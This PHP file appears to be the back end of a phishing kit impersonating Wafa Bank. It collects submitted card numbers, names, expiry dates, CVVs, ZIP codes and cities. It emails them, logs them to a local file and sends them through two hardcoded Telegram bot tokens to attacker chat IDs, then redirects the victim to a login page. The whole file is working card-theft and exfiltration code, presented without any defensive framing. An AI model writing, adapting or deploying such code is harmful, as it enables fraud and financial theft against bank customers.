<?php
$message .= "--++-----[WAFA-BANK-FUCKER]-----++--\n";
$message .= "Numeraux CC : ".$_POST['Carte']."\n";
$message .= "NOM : ".$_POST['nom']."\n";
$message .= "Exp date : ".$_POST['de']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "ZIP CODE : ".$_POST['zip']."\n";
$message .= "VILLE : ".$_POST['VILLE']."\n";
$message .= "-------------------BigDax ----------------------\n";
$subject .= "REZULTZZZ";
$sender = "WAFA-BANK";
mail($email,$subject,$message);

$text = fopen('../hi.txt', 'a');
fwrite($text, $message);
// IMPORTANT VARIABLE MUST BE CHANGED FOR TELEGRAM


$token = "2039965570:AAF1mSbNi349z0_Dka9v8N8c8xRH4iHKZRM";
    file_get_contents("https://api.telegram.org/bot2039965570:AAF1mSbNi349z0_Dka9v8N8c8xRH4iHKZRM/sendMessage?chat_id=1556350571&text=" . urlencode($message)."" );
$token = "2039965570:AAF1mSbNi349z0_Dka9v8N8c8xRH4iHKZRM";
    file_get_contents("https://api.telegram.org/bot5510438485:AAFoy-vw3ORSF5zIUYDDzqCYz81GB_ID0BQ/sendMessage?chat_id=+1842727350&text=" . urlencode($message)."" );


/////////////////////////////////////////////////////////

header("Location: login.php");?>
